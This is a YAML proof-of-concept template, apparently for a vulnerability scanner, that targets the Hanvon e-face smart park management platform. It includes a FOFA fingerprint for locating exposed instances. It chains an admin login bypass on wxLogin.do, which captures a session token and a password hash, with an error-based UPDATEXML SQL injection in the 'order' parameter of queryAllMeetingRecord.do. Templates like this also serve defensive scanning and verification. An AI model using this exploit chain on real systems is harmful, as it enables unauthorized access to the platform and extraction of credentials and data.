id: poc-yaml-hw-e-face-pass-spmp-queryallmeetingrecord-sqli
info:
  name: 汉王e脸通智慧园区管理平台 queryAllMeetingRecord.do SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: e脸通智慧园区管理平台
  fofa: icon_hash="1380907357"
variables:
  t1: random_int(1000,10000)
  t2: md5(t1)
requests:
- method: POST
  path: /manage/m/wxLogin.do?openid=1&username=admin&password=1&id=1&flag=1
  expression: status_code == 200 && contains(body,"\"userName\":\"admin\"") && matches(body,"\"password\":\"([0-9a-z]+)\"")
  output:
  - regex_match(body,"\"token\":\"(?P<token>.*?)\",")
- method: GET
  path: /manage/mobiMeetingApp/queryAllMeetingRecord.do?begin=&branchId=1&end=&page=1&pageSize=10&year=2025&recordId=1&order=(UPDATEXML(2920,CONCAT(0x7e,md5({{.t1}}),0x7e,(SELECT+(ELT(2920=2920,1)))),8357))
  headers:
    token: '{{.token}}'
  expression: status_code == 200 && contains(body,"success") && contains(body,"hanvon")
    && contains(body,"XPATH syntax error") && contains(body,"java.sql.SQLException")
    && contains(body,substr(t2,0,31))
transport: http
